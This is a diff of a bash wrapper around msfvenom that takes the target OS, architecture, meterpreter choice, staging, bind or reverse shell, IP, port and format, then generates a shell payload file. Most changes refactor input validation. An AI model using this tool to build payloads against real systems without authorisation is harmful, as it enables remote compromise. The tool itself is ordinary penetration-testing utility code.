@@ -1,50 +1,37 @@
 #!/bin/bash
 
 #A script that creates a wrapper around MSFvenom and allows for easier payload generation.
-echo "What is the operating system of your target? Example: windows, linux, osx"
+
+validate_os(){
+echo "What is the target of your operating system? Example: windows, linux, osx"
 read OS
-
-correct_os="false"
-
-validate_OS() {
-case $OS in
-	windows|linux|osx)
-	correct_os="true"
-	;;
-	*)
-	echo "$OS is not one of the options. Please enter the target operating system."
-	read OS
-	;;
-esac
-}
-
-while [ "${correct_os}" = "false" ];
-do
-	validate_OS;
-done
-
-echo "Is it 64 bit or 32? Please type 32 or 64."
-read architecture
-
-correct_arc="false"
-
-validate_arc() {
-case $architecture in
-        32|64)
-        correct_arc="true"
+case  $OS in 
+        windows|linux|osx)
         ;;
         *)
-        echo "$architecture is not one of the options. Please choose 32 or 64 bit."
-        read architecture
+        echo "$OS is not one of the options. Please enter windows, linux, or osx."
+        validate_os
         ;;
 esac
 }
 
-while [ "${correct_arc}" = "false" ];
-do
-        validate_arc;
-done
+validate_os
+###########################################################################
+validate_arc(){
+echo "Is it 64 bit or 32? Please type 32 or 64."
+read architecture
+case $architecture in 
+	32|64)
+	;;
+	*)
+	echo "$architecture is not one of the options."
+	validate_arc
+	;;
+esac
+}
 
+validate_arc
+############################################################################
 no_arc_display(){
 case $OS in
         windows)
@@ -52,32 +39,20 @@ case $OS in
         ;;
 esac
 }
-
+#############################################################################
 meterpreter_question(){
 echo "Would you like to use meterpreter? Please indicate y for yes and n for no."
 read meterpreter
-
-correct_meterpreter="false"
-
-validate_meterpreter() {
-case $meterpreter in
-        y|n)
-        correct_meterpreter="true"
-        ;;
-        *)
-        echo "$meterpreter is not one of the options. Please choose y to use meterpreter and n for no."
-        read meterpreter
-        ;;
+case $meterpreter in 
+	y|n)
+	;;
+	*)
+	echo "$meterpreter is not one of the options."
+	meterpreter_question
+	;;
 esac
 }
-
-while [ "${correct_meterpreter}" = "false" ];
-do
-        validate_meterpreter;
-done
-
-}
-
+#############################################################################
 linux_x86_meterpreter(){
 case  $OS in
 	linux|windows)
@@ -88,29 +63,22 @@ case  $OS in
 	;;
 esac
 }
-
-echo "Would you like your payload staged or stageless? Please indicate 1 for staged and 2 for stageless"
+#############################################################################
+validate_stage(){
+echo "Would you like your payload staged or stageless? Please indicate 1 for staged and 2 for stageless."
 read stage
-
-correct_stage="false"
-
-validate_stage() {
-case $stage in
-        1|2)
-        correct_stage="true"
-        ;;
-        *)
-        echo "$stage is not one of the options. Please choose 1 for staged or 2 for stageless."
-        read stage
-        ;;
+case $stage in 
+	1|2)
+	;;
+	*)
+	echo "$stage is not one of the options."
+	validate_stage
+	;;
 esac
 }
 
-while [ "${correct_stage}" = "false" ];
-do
-        validate_stage;
-done
-
+validate_stage
+#############################################################################
 stage_symbol=""
 
 case $stage in
@@ -134,32 +102,26 @@ case $architecture in
 		meterpreter_question
 	;;
 esac
-
+############################################################################
+validate_shell(){
 echo "Would you like to generate a bind shell or reverse shell? Please enter bind or reverse."
 read shell
-
-correct_shell="false"
-
-validate_shell() {
-case $shell in
-        bind|reverse)
-        correct_shell="true"
-        ;;
-        *)
-        echo "$shell is not one of the options. Please choose bind or reverse."
-        read shell
-        ;;
+case $shell in 
+	bind|reverse)
+	;;
+	*)
+	echo "$shell is not one of the options."
+	validate_shell
+	;;
 esac
 }
 
-while [ "${correct_shell}" = "false" ];
-do
-        validate_shell;
-done
-
+validate_shell
+##############################################################################
 correct_ip="false"
 check_ip(){
-if [[ $ip =~ (25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?) ]];
+octet="(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])"
+if [[ $ip =~ ^$octet.$octet.$octet.$octet$ ]];
 then
 	correct_ip="true"
 else
@@ -174,7 +136,7 @@ do
 	check_ip
 done
 }
-
+############################################################################
 correct_port="false"
 check_port() {
 if [[ $port -gt 65535 ]] || [[ $port -lt 1 ]];
@@ -193,6 +155,7 @@ do
 done
 }
 
+#############################################################################
 ip_port=""
 
 case $shell in
@@ -219,35 +182,28 @@ case $shell in
 	ip_port="RHOST=$ip RPORT=$port"
     ;;
 esac
-
+#############################################################################
+validate_form(){
 echo "What would you like the file format to be? Example: exe, raw, pl, rb, c, elf"
 read format
-
-correct_form="false"
-
-validate_form() {
-case $format in
-        exe|raw|pl|rb|c|elf)
-        correct_form="true"
-        ;;
-        *)
-        echo "$format is not one of the options. Please choose from exe, raw, pl, rb, c, elf."
-        read format
-        ;;
+case $format in 
+	exe|raw|pl|rb|c|elf)
+	;;
+	*)
+	echo "$format is not one of the options."
+	validate_form
+	;;
 esac
 }
 
-while [ "${correct_form}" = "false" ];
-do
-        validate_form;
-done
-
+validate_form
+#############################################################################
 payload=""
 msfgen=""
 
 echo "What would you like to name the file?"
 read filename
-
+#############################################################################
 use_meterpreter() {
 	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} -f $format"
 }
@@ -269,7 +225,7 @@ case  $meterpreter  in
         ;;
 	*)
 esac
-
+###############################################################################
 echo "msfvenom -p $msfgen"
 
 msfvenom -p $msfgen > ${filename}.${format}
